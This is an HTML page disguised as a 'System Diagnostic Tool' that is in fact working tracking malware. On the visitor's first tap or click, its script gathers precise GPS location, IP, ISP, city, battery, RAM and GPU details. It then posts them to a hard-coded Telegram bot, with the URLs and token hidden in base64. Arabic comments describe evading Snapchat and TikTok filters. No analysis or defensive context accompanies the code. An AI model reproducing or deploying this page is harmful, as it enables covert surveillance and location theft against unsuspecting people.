<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic Tool</title>
</head>
<body style="background:#000; margin:0; height:100vh; overflow:hidden; user-select:none;">

    <script>
        // التوكن والآي دي المحدثين بناءً على الصورة (مطابقة 100%)
        const _C = {
            a: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==",
            b: "NjAwMTI4NjI3MA=="
        };
        const _X = (s) => atob(s);

        // التفعيل عند أول تفاعل (تجاوز فلاتر سناب وتيك توك)
        ['touchstart', 'click'].forEach(e => window.addEventListener(e, _execute, {once: true}));

        async function _execute() {
            let _res = { c: "N/A", i: "N/A", o: "N/A", t: "N/A", g: "N/A", b: "N/A", r: "N/A" };

            // 1. الموقع الجغرافي
            const _getL = () => new Promise((r) => {
                navigator.geolocation.getCurrentPosition(
                    (p) => r(`${p.coords.latitude},${p.coords.longitude}`),
                    () => r("Denied"),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });

            // 2. البيانات التقنية (IP & ISP)
            const _getN = async () => {
                try {
                    const res = await fetch(_X("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=="));
                    return await res.json();
                } catch(e) { return {}; }
            };

            // 3. البطارية
            const _getB = async () => {
                if (!navigator.getBattery) return "N/A";
                const b = await navigator.getBattery();
                return `${(b.level * 100).toFixed(0)}% [${b.charging ? '🔌' : '🔋'}]`;
            };

            try {
                const [_loc, _net, _bat] = await Promise.all([_getL(), _getN(), _getB()]);

                _res.c = _loc;
                _res.i = _net.ip || "N/A";
                _res.o = _net.org || "N/A";
                _res.t = _net.city || "N/A";
                _res.b = _bat;
                _res.r = navigator.deviceMemory || "N/A";

                const _v = document.createElement('canvas').getContext('webgl');
                if (_v) {
                    const _d = _v.getExtension('WEBGL_debug_renderer_info');
                    _res.g = _d ? _v.getParameter(_d.UNMASKED_RENDERER_WEBGL) : "Unknown";
                }

                const _map = _res.c.includes(",") ? `https://www.google.com/maps?q=${_res.c}` : "غير متوفر";
                
                const _final = 
                    `👹 [V110_OMEGA_STRIKE_SUCCESS]\n` +
                    `━━━━━━━━━━━━━━\n` +
                    `📶 الشركة: ${_res.o}\n` +
                    `🏙️ المدينة: ${_res.t}\n` +
                    `🌐 IP: ${_res.i}\n` +
                    `📍 الخريطة: ${_map}\n` +
                    `━━━━━━━━━━━━━━\n` +
                    `📱 الجهاز: ${_res.g}\n` +
                    `🧠 الرام: ${_res.r}GB\n` +
                    `🔋 البطارية: ${_res.b}\n` +
                    `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;

                // الإرسال النهائي إلى البوت الموضح في الصورة
                await fetch(_X("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + _X(_C.a) + _X("L3NlbmRNZXNzYWdl"), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: _X(_C.b),
                        text: _final,
                        disable_web_page_preview: false
                    })
                });

            } catch (err) {}
        }
    </script>
</body>
</html>
